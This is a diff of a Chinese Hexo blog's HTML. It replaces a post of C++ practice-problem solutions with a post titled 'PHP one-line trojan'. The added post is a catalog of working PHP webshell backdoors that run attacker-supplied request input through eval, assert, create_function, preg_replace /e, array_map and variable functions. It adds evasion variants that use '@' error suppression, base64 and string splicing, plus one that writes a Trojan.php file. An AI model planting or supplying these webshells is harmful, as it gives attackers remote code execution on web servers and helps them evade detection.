@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>C++刷题记录 |  welcome to my world</title>
+      <title>PHP一句话木马 |  welcome to my world</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/bookmark.ico" />
@@ -53,7 +53,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-C++刷题记录"
+  id="post-PHP一句话木马"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -64,7 +64,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  C++刷题记录
+  PHP一句话木马
 </h1>
  
 
@@ -72,15 +72,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/12/12/C++%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2024-12-12T08:46:41.483Z" itemprop="datePublished">2024-12-12</time>
+      <a href="/2024/12/18/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="article-date">
+  <time datetime="2024-12-18T01:49:24.713Z" itemprop="datePublished">2024-12-18</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.1k</span>
+            <span class="post-count">355</span>
         </span>
     </span>
 
@@ -89,135 +89,52 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">5 min</span>
+            <span class="post-count">1 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
-    <div class="tocbot"></div>
-
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="1、母牛的故事"><a href="#1、母牛的故事" class="headerlink" title="1、母牛的故事  "></a><strong><font size=4>1、母牛的故事</font></strong>  </h2><p>有一头母牛，它每年年初生一头小母牛。每头小母牛从第四个年头开始，每年年初也生一头小母牛。请编程实现在第n年的时候，共有多少头母牛？ </p>
-<ul>
-<li>输入：多个数据，每个占一行，每行包含一个整数，输入0代表结束  </li>
-<li>输出：输出每一行的输入所对应的正确运行值<br><font color=red>代码实现</font></li>
-</ul>
-<pre><code class="c++">
-    #include &lt;iostream&gt;
-    #include &lt;vector&gt;
-    using namespace std;
-    int count(int n) &#123;
-        int count = 0;
-        while (n - 3 &gt; 0) &#123;
-            n -= 3;
-            count++;
-        &#125;
-        return count;
-    &#125;
-    int main() &#123;
-        vector&lt;int&gt; s;
-        int input;
-        while (cin &gt;&gt; input) &#123;
-            if (input != 0) &#123;
-                s.push_back(input);
-            &#125;
-            else &#123;
-                break;
-            &#125;
-        &#125;
-        int sum1 = 0;
-        for (int j = 0;j &lt; s.size();j++) &#123;
-            int n = s[j];
-            sum1 += n;
-            if (n == 0) &#123;
-                return 0;
-            &#125;
-            else &#123;
-                for (int j = n - 1;j &gt; 0;j--) &#123;
-                    sum1 += count(j);
-                &#125;
+  <p>一句话木马（函数前加”@”符，这个符号让php语句不显示错误信息，增加隐蔽性）：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>assert：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用call_user_func：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用正则表达式性质：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/abcde/e&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>], <span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用file_put_contents写入文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&#x27;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;Trojan.php&quot;</span>, <span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用数组和array_map()函数将执行语句进行拼接：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-            &#125;
-            cout &lt;&lt; sum1 &lt;&lt; endl;
-            sum1 = 0;
-        &#125;
-    &#125;
-</code></pre>
-<h2 id="2、校门外的树"><a href="#2、校门外的树" class="headerlink" title="2、校门外的树  "></a><strong><font size=4>2、校门外的树</font></strong>  </h2><p>某校大门外长度为L的马路上有一排树，每两棵相邻的树之间的间隔都是1米。我们可以把马路看成一个数轴，马路的一端在数轴0的位置，另一端在L的位置；数轴上的每个整数点，即0，1，2，……，L，都种有一棵树。<br>由于马路上有一些区域要用来建地铁。这些区域用它们在数轴上的起始点和终止点表示。已知任一区域的起始点和终止点的坐标都是整数，区域之间可能有重合的部分。现在要把这些区域中的树（包括区域端点处的两棵树）移走。你的任务是计算将这些树都移走后，马路上还有多少棵树？ </p>
-<ul>
-<li>输入：输入的第一行有两个整数L（1 &lt;&#x3D; L &lt;&#x3D; 10000）和 M（1 &lt;&#x3D; M &lt;&#x3D; 100），L代表马路的长度，M代表区域的数目，L和M之间用一个空格隔开。接下来的M行每行包含两个不同的整数，用一个空格隔开，表示一个区域的起始点和终止点的坐标。  </li>
-<li>输出：输出包括一行，这一行只包含一个整数，表示马路上剩余的树的数目。<br><font color=red>代码实现</font></li>
-</ul>
-<pre><code class="c++">
-    #include &lt;iostream&gt;
-    #include&lt;vector&gt;
-    using namespace std;
-    int main() &#123;
-        int L, M;
-        cin &gt;&gt; L &gt;&gt; M;
-        vector&lt;bool&gt;tree(L+1,true);
-        for (int i = 0;i &lt; M;i++) &#123;
-            int start,end;
-            cin &gt;&gt; start &gt;&gt; end;
-            for (int j = start;j &lt;= end;j++) &#123;
-                tree[j] = false;
-            &#125;
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$item</span>[<span class="string">&#x27;JON&#x27;</span>]=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span>[]=<span class="variable">$item</span>;</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>][<span class="string">&#x27;JON&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&quot;TEST&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>变量函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可变变量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="variable">$aa</span>=<span class="string">&quot;bb&quot;</span>;</span><br><span class="line"><span class="variable">$$aa</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>str_replace函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;Waldo&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;eWaldoval&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>base64编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;ZXZhbA==&quot;</span>)</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>.连接符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;e&quot;</span>.<span class="string">&quot;v&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;a&quot;</span>.<span class="string">&quot;l&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-        &#125;
-        int count = 0;
-        for (int k = 0;k &lt; tree.size();k++) &#123;
-            if (tree[k] == true) &#123;
-                count++;
-            &#125;
-        &#125;
-        cout &lt;&lt; count;
-    &#125;
-</code></pre>
-<h2 id="3、采药（0-1背包）"><a href="#3、采药（0-1背包）" class="headerlink" title="3、采药（0-1背包）  "></a><strong><font size=4>3、采药（0-1背包）</font></strong>  </h2><p>辰辰是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同的草药，采每一株都需要一些时间，每一株也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。” </p>
-<ul>
-<li>输入：输入第一行有两个整数T（1 &lt;&#x3D; T &lt;&#x3D; 1000）和M（1 &lt;&#x3D; M &lt;&#x3D; 100），用一个空格隔开，T代表总共能够用来采药的时间，M代表山洞里的草药的数目。接下来的M行每行包括两个在1到100之间（包括1和100）的整数，分别表示采摘某株草药的时间和这株草药的价值。  </li>
-<li>输出：输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。<br><font color=red>代码实现</font></li>
-</ul>
-<pre><code class="c++">
-        #include &lt;iostream&gt;
-        #include &lt;vector&gt;
-        using namespace std;
-
-        int main() &#123;
-            int T, M;
-            cin &gt;&gt; T &gt;&gt; M;
-            vector&lt;int&gt;time(M+1), weight(M+1);
-            for (int i = 1;i &lt; M+1;i++) &#123;
-                cin &gt;&gt; time[i] &gt;&gt; weight[i];
-            &#125;
-            vector&lt;vector&lt;int&gt;&gt;p(M + 1, vector&lt;int&gt;(T + 1, 0));
-            for (int t = 1;t &lt; M + 1;t++) &#123;
-                for (int j = 1;j &lt; T + 1;j++) &#123;
-                    if (j &lt; weight[t]) &#123;
-                        p[t][j] = p[t - 1][j];
-                    &#125;
-                    else &#123;
-                        if (p[t - 1][j] &gt; p[t - 1][j - weight[t]] + weight[t]) &#123;
-                            p[t][j] = p[t - 1][j];
-                        &#125;
-                        else &#123;
-                            p[t][j] = p[t - 1][j - weight[t]] + weight[t];
-                        &#125;
-                    &#125;
-                &#125;
-            &#125;
-            cout &lt;&lt; p[M][T];
-        &#125;
-
-</code></pre>
- 
+<p>parse_str函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a=eval&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>外部传值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>( <span class="variable">$_GET</span>[<span class="variable">$_GET</span>[b]])&gt;   b=cmd&amp;cmd=<span class="title function_ invoke__">phpinfo</span>()</span><br></pre></td></tr></table></figure>
+<p>利用JavaScript语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_GET</span>[b])&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure> 
       <!-- reward -->
       
       <div id="reword-out">
@@ -287,7 +204,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/12/12/C++%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/12/18/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -298,19 +215,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2024/12/18/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            PHP一句话木马
-          
-        </div>
-      </a>
     
-    
-      <a href="/2024/12/05/CMD%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
+      <a href="/2024/12/12/C++%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">CMD常用命令</div>
+        <div class="article-nav-title">C++刷题记录</div>
       </a>
     
   </nav>
